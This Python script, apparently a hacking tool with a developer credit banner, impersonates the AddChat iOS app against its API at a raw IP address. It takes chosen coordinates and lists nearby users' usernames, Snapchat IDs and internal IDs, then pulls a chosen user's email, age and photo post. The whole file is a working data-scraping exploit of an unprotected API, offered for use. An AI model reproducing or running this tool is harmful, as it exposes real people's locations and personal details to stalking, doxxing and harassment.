import requests
import os, sys
import json
green_color = "\033[1;32m"
red_color = "\033[1;31m"
detect_color = "\033[1;34m"
banner_color = "\033[1;33;40m"
end_banner_color = "\33[00m"

r = requests.session()



print (detect_color+"""

                 

 ▄████▄   ██░ ██  ▄▄▄       ██▀███   ██▓     ██▓▓█████
▒██▀ ▀█  ▓██░ ██▒▒████▄    ▓██ ▒ ██▒▓██▒    ▓██▒▓█   ▀
▒▓█    ▄ ▒██▀▀██░▒██  ▀█▄  ▓██ ░▄█ ▒▒██░    ▒██▒▒███
▒▓▓▄ ▄██▒░▓█ ░██ ░██▄▄▄▄██ ▒██▀▀█▄  ▒██░    ░██░▒▓█  ▄
▒ ▓███▀ ░░▓█▒░██▓ ▓█   ▓██▒░██▓ ▒██▒░██████▒░██░░▒████▒
░ ░▒ ▒  ░ ▒ ░░▒░▒ ▒▒   ▓▒█░░ ▒▓ ░▒▓░░ ▒░▓  ░░▓  ░░ ▒░ ░
  ░  ▒    ▒ ░▒░ ░  ▒   ▒▒ ░  ░▒ ░ ▒░░ ░ ▒  ░ ▒ ░ ░ ░  ░
░         ░  ░░ ░  ░   ▒     ░░   ░   ░ ░    ▒ ░   ░
░ ░       ░  ░  ░      ░  ░   ░         ░  ░ ░     ░  ░
░
 

++ The developer : Falah - 0xfff080

snapchat : flaah999

https://www.google.com/maps/place

( google maps ) -> 27.470736 , 41.660869

---------------------------------------
""")

ss = input (end_banner_color+'latitude -> ')
ss1 = input ('longitude -> ')

url = "http://18.218.250.20:6060/api_v2/get_nearby_selfie"

payload = "latitude="+ss+"&login_user_id=613bfa9b56b0810d91528761&longitude="+ss1+"&page=1"
headers = {
    "Accept": "*/*",
    "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
    "User-Agent": "AddChat/1.4.3 (com.selfiechat.addchat; build:12; iOS 14.4.1) Alamofire/5.2.2",
    "Connection": "close",
    "Host": "18.218.250.20:6060",
    "Accept-Encoding": "gzip, deflate",
}

response = r.post(url, data=payload, headers=headers).text
info = json.loads(response)


for i in range(200):

  if 'data' in response:
            try:
                print(red_color+"---------------------------------------")
                print(green_color +" --> Name : "+str(info["data"][i]["user"]["username"]))
                print(green_color +" --> user snapchat : "+str(info["data"][i]["user"]["snapchat_id"]))
                print(green_color +" --> id : "+str(info["data"][i]["user"]["_id"]))
                
            except:
                print ("---E----N----D")

ss3 = input ('id user snapchat -> ')


url = "http://18.218.250.20:6060/api_v2/get_login_user_details"

payload = "login_user_id="+ss3+""
headers = {
    "Accept": "*/*",
    "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
    "User-Agent": "AddChat/1.4.3 (com.selfiechat.addchat; build:12; iOS 14.4.1) Alamofire/5.2.2",
    "Connection": "close",
    "Host": "18.218.250.20:6060",
    "Accept-Encoding": "gzip, deflate",
}

response = r.post(url, data=payload, headers=headers).text
info = json.loads(response)

if 'data' in response:
            try:
                print(red_color+"---------------------------------------")
                print(green_color +" --> Name : "+str(info["data"]["username"]))
                print(green_color +" --> user snapchat : "+str(info["data"]["snapchat_id"]))
                print(green_color +" --> email : "+str(info["data"]["email"]))
                print(green_color +" --> age : "+str(info["data"]["age"]))
                print(green_color +" --> post : "+str(info["data"]["posts"][0]["photo"]))
                
            except:
                print ("---E----N----D")
                exit()

